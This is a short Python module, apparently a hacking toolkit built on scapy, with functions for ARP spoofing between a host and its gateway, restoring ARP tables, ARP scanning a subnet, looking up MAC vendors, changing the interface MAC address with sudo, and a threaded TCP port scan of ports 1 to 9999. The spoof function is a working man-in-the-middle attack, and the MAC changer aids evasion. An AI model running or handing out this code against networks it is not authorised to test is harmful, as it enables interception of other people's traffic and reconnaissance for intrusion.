import scapy.all as scapy
import subprocess, socket
import concurrent.futures

def spoof (host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip)
    scapy.send(packet1,verbose=False)
    scapy.send(packet2,verbose=False)

def restore(host_ip,host_mac,gateway,gateway_mac):
    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway, hwsrc=gateway_mac)
    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip, hwsrc=host_mac)
    scapy.send(packet1 , verbose=False)
    scapy.send(packet2 , verbose=False)

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff ')
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].src

def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list

def get_mac_vendor(mac):
    mac = mac.upper().replace(':','')[0:6]
    with open("mac-vendor.txt","r") as f:
        for line in f :
            if mac in line:
                return line[7:]
    return 'Unknown' 

def change_mac(interface,new_mac):
    subprocess.call(["sudo","ifconfig",interface,"down"])
    subprocess.call(["sudo","ifconfig",interface,"hw","ether",new_mac])
    subprocess.call(["sudo","ifconfig",interface,"up"])

def pscan(port,target):
    target  = socket.gethostbyname(target)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((target, port))
    if result == 0:
        print("Open Port on : "+ str(port))
    sock.close()

def scan_ports(target):
    port_list = list(range(1,10000))
    target = target.split(' ') * len(port_list)
    with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(pscan, port_list, target)